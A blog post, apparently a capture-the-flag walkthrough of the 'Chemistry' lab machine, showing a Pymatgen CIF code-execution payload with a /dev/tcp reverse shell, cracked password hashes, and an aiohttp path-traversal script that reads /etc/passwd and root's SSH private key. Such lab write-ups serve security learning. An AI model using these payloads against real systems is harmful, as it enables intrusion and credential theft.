@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Easy - Chemistry - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Easy - Chemistry</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1729539149571"
+                  >2024-10-21 21:32</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156163662"
+                  >2025-03-16 21:16</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">python</span>
+              
+              <span class="keyword">pathtraversal</span>
+              
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>$nmap -p- -A <span class="hljs-number">10.129</span><span class="hljs-number">.159</span><span class="hljs-number">.76</span>
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-21</span> <span class="hljs-number">19</span>:<span class="hljs-number">34</span> UTC
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.159</span><span class="hljs-number">.76</span>
+Host is up (<span class="hljs-number">0.063</span>s latency).
+Not shown: <span class="hljs-number">65533</span> closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.11</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| <span class="hljs-type">ssh</span>-hostkey: 
+|   <span class="hljs-type">3072</span> b6:fc:<span class="hljs-number">20</span>:ae:<span class="hljs-number">9</span>d:<span class="hljs-number">1</span>d:<span class="hljs-number">45</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">0</span>b:ce:d9:d0:<span class="hljs-number">20</span>:f2:<span class="hljs-number">6</span>f:dc (RSA)
+|   <span class="hljs-type">256</span> f1:ae:<span class="hljs-number">1</span>c:<span class="hljs-number">3</span>e:<span class="hljs-number">1</span>d:ea:<span class="hljs-number">55</span>:<span class="hljs-number">44</span>:<span class="hljs-number">6</span>c:<span class="hljs-number">2</span>f:f2:<span class="hljs-number">56</span>:<span class="hljs-number">8</span>d:<span class="hljs-number">62</span>:<span class="hljs-number">3</span>c:<span class="hljs-number">2</span>b (ECDSA)
+|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">94</span>:<span class="hljs-number">42</span>:<span class="hljs-number">1</span>b:<span class="hljs-number">78</span>:f2:<span class="hljs-number">51</span>:<span class="hljs-number">87</span>:<span class="hljs-number">07</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">97</span>:<span class="hljs-number">26</span>:c9:a2:<span class="hljs-number">5</span>c:<span class="hljs-number">0</span>a:<span class="hljs-number">26</span> (ED25519)
+<span class="hljs-number">5000</span>/tcp open  upnp?
+| <span class="hljs-type">fingerprint</span>-strings: 
+|   <span class="hljs-type">GetRequest</span>: 
+|     <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
+|     <span class="hljs-type">Server</span>: Werkzeug/<span class="hljs-number">3.0</span><span class="hljs-number">.3</span> Python/<span class="hljs-number">3.9</span><span class="hljs-number">.5</span>
+|     <span class="hljs-type">Date</span>: Mon, <span class="hljs-number">21</span> Oct <span class="hljs-number">2024</span> <span class="hljs-number">19</span>:<span class="hljs-number">34</span>:<span class="hljs-number">23</span> GMT
+|     <span class="hljs-type">Content</span>-<span class="hljs-keyword">Type</span>: text/html; charset=utf<span class="hljs-number">-8</span>
+|     <span class="hljs-type">Content</span>-Length: <span class="hljs-number">719</span>
+|     <span class="hljs-type">Vary</span>: Cookie
+|     <span class="hljs-type">Connection</span>: close
+|     <span class="hljs-type">&lt;!DOCTYPE</span> html&gt;
+|     <span class="hljs-type">&lt;html</span> lang=<span class="hljs-string">"en"</span>&gt;
+|     <span class="hljs-type">&lt;head</span>&gt;
+|     <span class="hljs-type">&lt;meta</span> charset=<span class="hljs-string">"UTF-8"</span>&gt;
+|     <span class="hljs-type">&lt;meta</span> name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;
+|     <span class="hljs-type">&lt;title</span>&gt;Chemistry - Home&lt;/title&gt;
+|     <span class="hljs-type">&lt;link</span> rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"/static/styles.css"</span>&gt;
+|     <span class="hljs-type">&lt;/head</span>&gt;
+|     <span class="hljs-type">&lt;body</span>&gt;
+|     <span class="hljs-type">&lt;div</span> class=<span class="hljs-string">"container"</span>&gt;
+|     <span class="hljs-type">class</span>=<span class="hljs-string">"title"</span>&gt;Chemistry CIF Analyzer&lt;/h1&gt;
+|     <span class="hljs-type">&lt;p</span>&gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information <span class="hljs-keyword">File</span>) and analyze the structural data contained within.&lt;/p&gt;</code></pre></div>
+<p><img src="/_resources/cc8668f916934b40b40729f9588bdcf1.png" /></p>
+<h1 id="chemistry-cif-analyzer">Chemistry CIF Analyzer</h1>
+<p>Using Register we can create new account and get access to the dashboard with upload functionality.</p>
+<p><img src="/_resources/b1739f78bf694e81ba1c2c69f06cfa42.png" /></p>
+<p><img src="/_resources/10fa0230aee543a198e1ec2cc026ea65.png" /></p>
+<p>It allows us only to upload only .cif files, i.e:</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">data_Example</span>
+<span class="hljs-attribute">_cell_length_a</span>    <span class="hljs-number">10</span>.<span class="hljs-number">00000</span>
+<span class="hljs-attribute">_cell_length_b</span>    <span class="hljs-number">10</span>.<span class="hljs-number">00000</span>
+<span class="hljs-attribute">_cell_length_c</span>    <span class="hljs-number">10</span>.<span class="hljs-number">00000</span>
+<span class="hljs-attribute">_cell_angle_alpha</span> <span class="hljs-number">90</span>.<span class="hljs-number">00000</span>
+<span class="hljs-attribute">_cell_angle_beta</span>  <span class="hljs-number">90</span>.<span class="hljs-number">00000</span>
+<span class="hljs-attribute">_cell_angle_gamma</span> <span class="hljs-number">90</span>.<span class="hljs-number">00000</span>
+<span class="hljs-attribute">_symmetry_space_group_name_H</span>-M 'P <span class="hljs-number">1</span>'
+<span class="hljs-attribute">loop_</span>
+ <span class="hljs-attribute">_atom_site_label</span>
+ <span class="hljs-attribute">_atom_site_fract_x</span>
+ <span class="hljs-attribute">_atom_site_fract_y</span>
+ <span class="hljs-attribute">_atom_site_fract_z</span>
+ <span class="hljs-attribute">_atom_site_occupancy</span>
+ <span class="hljs-attribute">H</span> <span class="hljs-number">0</span>.<span class="hljs-number">00000</span> <span class="hljs-number">0</span>.<span class="hljs-number">00000</span> <span class="hljs-number">0</span>.<span class="hljs-number">00000</span> <span class="hljs-number">1</span>
+ <span class="hljs-attribute">O</span> <span class="hljs-number">0</span>.<span class="hljs-number">50000</span> <span class="hljs-number">0</span>.<span class="hljs-number">50000</span> <span class="hljs-number">0</span>.<span class="hljs-number">50000</span> <span class="hljs-number">1</span></code></pre></div>
+<p>We can then proces this file by pressing View.</p>
+<p><img src="/_resources/14b87add442342299c81cbbaecda8d5a.png" /></p>
+<p>Uploading any other file type is blocked. We can however change content-type, but any other file makes the site crash. I tried adding <code>;whoami;</code> at the end of cell_length, so that it is processed, but that it also causes the site to crash.</p>
+<p>Let’s try to understand how it is processed then. Reading more about our example file, it turns out that it is a <a title="https://en.wikipedia.org/wiki/Crystallographic_Information_File" href="https://en.wikipedia.org/wiki/Crystallographic_Information_File">standard for representing crystallographic information</a>.</p>
+<div><pre class="hljs"><code>$whatweb http://10.129.231.170:5000/
+http://10.129.231.170:5000/ <span class="hljs-comment">[200 OK]</span> Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Werkzeug/3.0.3 Python/3.9.5]</span>, IP<span class="hljs-comment">[10.129.231.170]</span>, Python<span class="hljs-comment">[3.9.5]</span>, Title<span class="hljs-comment">[Chemistry - Home]</span>, Werkzeug<span class="hljs-comment">[3.0.3]</span></code></pre></div>
+<p>Looking for popular python CIF processing libraries I’ve found CIFTools, PyCIF, ASE, Pymatgen, MDAnalysis, CifFile. Looking for CVE’s for any of them, only <a title="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f" href="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f">Pymatgen has one</a>.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">data_5yOhtAoR</span>
+<span class="hljs-attribute">_audit_creation_date</span>            <span class="hljs-number">2018</span>-<span class="hljs-number">06</span>-<span class="hljs-number">08</span>
+<span class="hljs-attribute">_audit_creation_method</span>          <span class="hljs-string">"Pymatgen CIF Parser Arbitrary Code Execution Exploit"</span>
+
+<span class="hljs-attribute">loop_</span>
+<span class="hljs-attribute">_parent_propagation_vector</span>.id
+<span class="hljs-attribute">_parent_propagation_vector</span>.kxkykz
+<span class="hljs-attribute">k1</span><span class="hljs-meta"> [0 0 0]</span>
+
+<span class="hljs-attribute">_space_group_magn</span>.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[<span class="hljs-number">1</span>].__getattribute__ ( *[().__class__.__mro__[<span class="hljs-number">1</span>]]+[<span class="hljs-string">"__sub"</span> + <span class="hljs-string">"classes__"</span>]) () if d.__name__ == <span class="hljs-string">"BuiltinImporter"</span>][<span class="hljs-number">0</span>].load_module (<span class="hljs-string">"os"</span>).system (<span class="hljs-string">"/bin/bash -c 'sh -i &gt;&amp; /dev/tcp/10.10.16.21/4444 0&gt;&amp;1'"</span>);<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>'
+
+
+<span class="hljs-attribute">_space_group_magn</span>.number_BNS  <span class="hljs-number">62</span>.<span class="hljs-number">448</span>
+<span class="hljs-attribute">_space_group_magn</span>.name_BNS  <span class="hljs-string">"P  n'  m  a'  </span></code></pre></div>
+<p>Uploading this file and and trying to view it, get’s us the shell.</p>
+<div><pre class="hljs"><code>$nc -lvnp <span class="hljs-number">4444</span>
+listening <span class="hljs-keyword">on</span> [any] <span class="hljs-number">4444</span> ...
+connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">16.21</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">231.170</span>] <span class="hljs-number">46078</span>
+<span class="hljs-symbol">sh:</span> <span class="hljs-number">0</span>: can<span class="hljs-comment">'t access tty; job control turned off</span></code></pre></div>
+<p>Let’s stabilize the shell and go for the root.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm
+CTRL-Z
+stty<span class="hljs-built_in"> raw </span>-echo; fg</code></pre></div>
+<h1 id="user-priv-esc">User priv esc</h1>
+<p>In our home folder we have a couple of folders, one of them is called instance and has a file called database.db. Looking at it’s content we can find interesting data.</p>
+<div><pre class="hljs"><code>sqlite&gt; SELECT name FROM sqlite_master WHERE type='table';
+structure
+user
+sqlite&gt; SELECT * FROM user;
+<span class="hljs-number">1</span>|<span class="hljs-type">admin</span>|<span class="hljs-type">2861debaf8d99436a10ed6f75a252abf</span>
+<span class="hljs-number">2</span>|<span class="hljs-type">app</span>|<span class="hljs-type">197865e46b878d9e74a0346b6d59886a</span>
+<span class="hljs-number">3</span>|<span class="hljs-type">rosa</span>|<span class="hljs-type">63ed86ee9f624c7b14f1d4f43dc251a5</span>
+<span class="hljs-number">4</span>|<span class="hljs-type">robert</span>|<span class="hljs-type">02fcf7cfc10adc37959fb21f06c6b467</span>
+<span class="hljs-number">5</span>|<span class="hljs-type">jobert</span>|<span class="hljs-type">3dec299e06f7ed187bac06bd3b670ab2</span>
+<span class="hljs-number">6</span>|<span class="hljs-type">carlos</span>|<span class="hljs-type">9ad48828b0955513f7cf0f7f6510c8f8</span>
+<span class="hljs-number">7</span>|<span class="hljs-type">peter</span>|<span class="hljs-type">6845c17d298d95aa942127bdad2ceb9b</span>
+<span class="hljs-number">8</span>|<span class="hljs-type">victoria</span>|<span class="hljs-type">c3601ad2286a4293868ec2a4bc606ba3</span>
+<span class="hljs-number">9</span>|<span class="hljs-type">tania</span>|<span class="hljs-type">a4aa55e816205dc0389591c9f82f43bb</span>
+<span class="hljs-number">10</span>|<span class="hljs-type">eusebio</span>|<span class="hljs-type">6cad48078d0241cca9a7b322ecd073b3</span>
+<span class="hljs-number">11</span>|<span class="hljs-type">gelacia</span>|<span class="hljs-type">4af70c80b68267012ecdac9a7e916d18</span>
+<span class="hljs-number">12</span>|<span class="hljs-type">fabian</span>|<span class="hljs-type">4e5d71f53fdd2eabdbabb233113b5dc0</span>
+<span class="hljs-number">13</span>|<span class="hljs-type">axel</span>|<span class="hljs-type">9347f9724ca083b17e39555c36fd9007</span>
+<span class="hljs-number">14</span>|<span class="hljs-type">kristel</span>|<span class="hljs-type">6896ba7b11a62cacffbdaded457c6d92</span>
+<span class="hljs-number">15</span>|<span class="hljs-type">test</span>|<span class="hljs-type">098f6bcd4621d373cade4e832627b4f6</span></code></pre></div>
+<p>We know that there is user <code>rosa</code> on our system, as it has a home folder. Looking up her’s hash in <a title="https://crackstation.net/" href="https://crackstation.net/">crackstation</a>, we get pass <code>unicorniosrosados</code>. It get’s us in.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Running linenum we can find new port accessible localy. Let’s look at it then by connecting via ssh, <code>ssh -L 8080:localhost:8080 rosa@10.129.231.170</code>.</p>
+<div><pre class="hljs"><code>[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>0.0.0.0:5000            0.0.0.0:*               LISTEN      1035/python3.9      
+tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6      <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>:::22                   :::*                    LISTEN      -                   </code></pre></div>
+<p><img src="/_resources/d081e26f1548428ab5b8812b9ef19f33.png" /></p>
+<p>We can see that the site is also run by root.<br />
+<code>root        1036  0.0  1.4 331388 28560 ?        Ssl  11:05   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py</code></p>
+<div><pre class="hljs"><code><span class="hljs-variable">$whatweb</span> http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span>/
+http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/ [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[::1], JQuery[3.6.0], Script, Title[Site Monitoring]</span></code></pre></div>
+<p>It seems that aiohttp has a <a title="https://github.com/advisories/GHSA-5h86-8mv2-jq9f" href="https://github.com/advisories/GHSA-5h86-8mv2-jq9f">vulnerability</a>, simple path travelsal. Someone even created a <a title="https://raw.githubusercontent.com/z3rObyte/CVE-2024-23334-PoC/refs/heads/main/exploit.sh" href="https://raw.githubusercontent.com/z3rObyte/CVE-2024-23334-PoC/refs/heads/main/exploit.sh">simple script</a> for testing it. It does not work, but looking at the site’s source, we can see it’s file files it’s referencing. Modifing it to check starting with <code>/assets</code>, get’s us passwd.</p>
+<p><img src="/_resources/3c05302f45f441fc8aa5c4945b4261d5.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+
+url=<span class="hljs-string">"http://localhost:8080/assets"</span>
+string=<span class="hljs-string">"../"</span>
+payload=<span class="hljs-string">"/static/"</span>
+file=<span class="hljs-string">"etc/passwd"</span> <span class="hljs-comment"># without the first /</span>
+
+<span class="hljs-keyword">for</span> ((i=0; i&lt;15; i++)); <span class="hljs-keyword">do</span>
+    payload+=<span class="hljs-string">"<span class="hljs-variable">$string</span>"</span>
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Testing with $payload<span class="hljs-variable">$file</span>"</span>
+    status_code=$(curl --path-as-is -s -o /dev/null -w <span class="hljs-string">"%{http_code}"</span> <span class="hljs-string">"$url$payload<span class="hljs-variable">$file</span>"</span>)
+    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\tStatus code --&gt; <span class="hljs-variable">$status_code</span>"</span>
+
+    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$status_code</span> -eq 200 ]]; <span class="hljs-keyword">then</span>
+        curl -s --path-as-is <span class="hljs-string">"$url$payload<span class="hljs-variable">$file</span>"</span>
+        <span class="hljs-built_in">break</span>
+    <span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">done</span></code></pre></div>
+<p><img src="/_resources/80de985257ef4720af97904ef25058e4.png" /></p>
+<p>We can modify the script to get root ssh.</p>
+<div><pre class="hljs"><code>└──╼ $./exploit.sh 
+[+] Testing with <span class="hljs-regexp">/static/</span>..<span class="hljs-regexp">/root/</span>.ssh/id_rsa
+    Status code --&gt; <span class="hljs-number">404</span>
+[+] Testing with <span class="hljs-regexp">/static/</span>..<span class="hljs-regexp">/../</span>root<span class="hljs-regexp">/.ssh/i</span>d_rsa
+    Status code --&gt; <span class="hljs-number">404</span>
+[+] Testing with <span class="hljs-regexp">/static/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/root/</span>.ssh/id_rsa
+    Status code --&gt; <span class="hljs-number">404</span>
+[+] Testing with <span class="hljs-regexp">/static/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>root<span class="hljs-regexp">/.ssh/i</span>d_rsa
+    Status code --&gt; <span class="hljs-number">200</span>
+-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
+UbnmTGaPeW4evLeehnYFQleaC9u<span class="hljs-regexp">//</span>vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1v
+j0wO69QoWrHERaRqmTzranVyYAdTmiXlGqUyiy0I7GVYqhv/QC7jt6For4PMAjcT0ED3Gk
+HVJONbz2eav5aFJcOvsCG1aC93Le5R43Wgwo7kHPlfM5DjSDRqmBxZpaLpWK3HwCKYITbo
+DfYsOMY0zyI0k5yLl1s685qJIYJHmin9HZBmDIwS7e2riTHhNbt2naHxd0WkJ8PUTgXuV2
+UOljWP/TVPTkM5byav5bzhIwxhtdTy02DWjqFQn2kaQ8xe9X+Ymrf2wK8C4ezAycvlf3Iv
+ATj++Xrpmmh9uR1HdS1XvD7glEFqNbYo3Q/OhiMto1JFqgWugeHm715yDnB3A+og4SFzrE
+vrLegAOwvNlDYGjJWnTqEmUDk9ruO4Eq4ad1TYMbAAAFiPikP5X4pD+VAAAAB3NzaC1yc2
+&lt;SNIP&gt;</code></pre></div>
+<p>Log in and we are done.</p>
+<p><img src="/_resources/d372c4ddddd045dd8eef1047fbd137a0.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
